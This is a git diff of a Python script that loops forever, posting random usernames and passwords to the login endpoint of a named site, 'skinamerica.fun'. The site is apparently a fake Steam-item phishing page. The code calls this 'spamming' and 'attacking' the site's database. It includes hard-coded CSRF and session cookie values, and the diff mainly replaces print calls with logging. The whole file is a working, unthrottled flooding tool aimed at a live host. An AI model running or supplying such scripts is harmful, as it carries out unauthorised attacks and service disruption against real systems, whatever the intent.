@@ -1,23 +1,15 @@
 #!python3
 import requests
+import logging
 import random
 import string
+
+logging.basicConfig(format='%(asctime)s %(message)s', datefmt='%m/%d/%Y %I:%M:%S %p')
 
 def randomString(stringLength=10):
 	"""Generate a random string of fixed length """
 	letters = string.ascii_lowercase+string.ascii_uppercase+string.digits
 	return ''.join(random.choice(letters) for i in range(stringLength))
-
-cookies = {
-#	'__ddg_': '856806E1D761B35E7BE4173938CABFA9052143F6',
-	'_csrf': 'tAgle4ZPqH5PysmmkuZtYtDZ',
-#	'XSRF-TOKEN': 'J2vg9DJs-jEQX97cQKqq-3VqUvX95KKp6h64',
-#	'connect.sid': 's%3Aheppfz0bgX8TALAmhlM5gVfFuToKzYd5.zcvVtjQKgHehDXUb9fTSYATM1Ocafaer9luITzifKgE',
-#	'item': '{name:Karambit | Crimson Web,quality:Minimal Wear,img:https://steamcommunity-a.akamaihd.net/economy/image/-9a81dlWLwJ2UUGcVs_nsVtzdOEdtWwKGZZLQHTxDZ7I56KU0Zwwo4NUX4oFJZEHLbXH5ApeO4YmlhxYQknCRvCo04DEVlxkKgpovbSsLQJf2PLacDBA5ciJnJm0gPL2IITdn2xZ_Pp9i_vG8MKj2Qbl_EdlZziiddOXdAY2YAvT-wW2xrjugJG_tcvNyyBn6SEm4XuMgVXp1n8qZn5H/360fx360f}',
-#	'img': 'https://steamcommunity-a.akamaihd.net/economy/image/-9a81dlWLwJ2UUGcVs_nsVtzdOEdtWwKGZZLQHTxDZ7I56KU0Zwwo4NUX4oFJZEHLbXH5ApeO4YmlhxYQknCRvCo04DEVlxkKgpovbSsLQJf2PLacDBA5ciJnJm0gPL2IITdn2xZ_Pp9i_vG8MKj2Qbl_EdlZziiddOXdAY2YAvT-wW2xrjugJG_tcvNyyBn6SEm4XuMgVXp1n8qZn5H/360fx360f',
-#	'name': 'Karambit | Crimson Web (Minimal Wear)',
-	'human': 'yes',
-}
 
 headers = {
 	'Host': 'skinamerica.fun',
@@ -31,9 +23,26 @@ headers = {
 	'Connection': 'keep-alive',
 }
 
-print('Spamming "skinamerica.fun" database...')
-print('Headers used to attack the offending db:\n{}'.format(headers))
-print('Cookies used to attack the offending db:\n{}'.format(cookies))
+cookies = {
+#	'__ddg_': '856806E1D761B35E7BE4173938CABFA9052143F6',
+	'_csrf': 'tAgle4ZPqH5PysmmkuZtYtDZ',
+#	'XSRF-TOKEN': 'J2vg9DJs-jEQX97cQKqq-3VqUvX95KKp6h64',
+#	'connect.sid': 's%3Aheppfz0bgX8TALAmhlM5gVfFuToKzYd5.zcvVtjQKgHehDXUb9fTSYATM1Ocafaer9luITzifKgE',
+#	'item': '{name:Karambit | Crimson Web,quality:Minimal Wear,img:https://steamcommunity-a.akamaihd.net/economy/image/-9a81dlWLwJ2UUGcVs_nsVtzdOEdtWwKGZZLQHTxDZ7I56KU0Zwwo4NUX4oFJZEHLbXH5ApeO4YmlhxYQknCRvCo04DEVlxkKgpovbSsLQJf2PLacDBA5ciJnJm0gPL2IITdn2xZ_Pp9i_vG8MKj2Qbl_EdlZziiddOXdAY2YAvT-wW2xrjugJG_tcvNyyBn6SEm4XuMgVXp1n8qZn5H/360fx360f}',
+#	'img': 'https://steamcommunity-a.akamaihd.net/economy/image/-9a81dlWLwJ2UUGcVs_nsVtzdOEdtWwKGZZLQHTxDZ7I56KU0Zwwo4NUX4oFJZEHLbXH5ApeO4YmlhxYQknCRvCo04DEVlxkKgpovbSsLQJf2PLacDBA5ciJnJm0gPL2IITdn2xZ_Pp9i_vG8MKj2Qbl_EdlZziiddOXdAY2YAvT-wW2xrjugJG_tcvNyyBn6SEm4XuMgVXp1n8qZn5H/360fx360f',
+#	'name': 'Karambit | Crimson Web (Minimal Wear)',
+	'human': 'yes',
+}
+
+logging.info('Spamming "skinamerica.fun" database...')
+logging.debug('Headers used to attack the offending db:')
+for h in headers:
+	logging.debug(h)
+
+logging.debug('Cookies used to attack the offending db:')
+for c in cookies:
+	logging.debug(c)
+
 
 while True:
 
@@ -41,21 +50,23 @@ while True:
 	password = randomString(random.randrange(12,20,1))
 
 	params = {
-		'emailauth': '',
-		'emailsteamid': '',
-		'loginfriendlyname': '',
-		'login': username,
-		'domain': 'skinamerica.fun',
-		'_csrf': 'k2hy76jh-JOGwlBDHExj2q0NpNa6AqKWX17o',
-		'password': password,
-		'captchagid': '-1',
-		'captcha_text': ''
+	'emailauth': '',
+	'emailsteamid': '',
+	'loginfriendlyname': '',
+	'login': username,
+	'domain': 'skinamerica.fun',
+	'_csrf': 'k2hy76jh-JOGwlBDHExj2q0NpNa6AqKWX17o',
+	'password': password,
+	'captchagid': '-1',
+	'captcha_text': ''
 	}
 
-	print('Params used to attack offending db:\n{}' .format(params))
-
-	print('Logging in with:\n- user     : {}\n- password : {}'.format(username, password))
+	logging.debug('Params used to attack offending db:')
+	for p in params:
+		logging.debug(p)
+	
+	logging.info('Logging in with:\n- user     : {}\n- password : {}'.format(username, password))
 
 	response = requests.post('https://skinamerica.fun/auth', headers=headers, cookies=cookies, params=params)
 	
-	print('Response from server: {}'.format(response.status_code))
+	logging.info('Response from server: {}'.format(response.status_code))
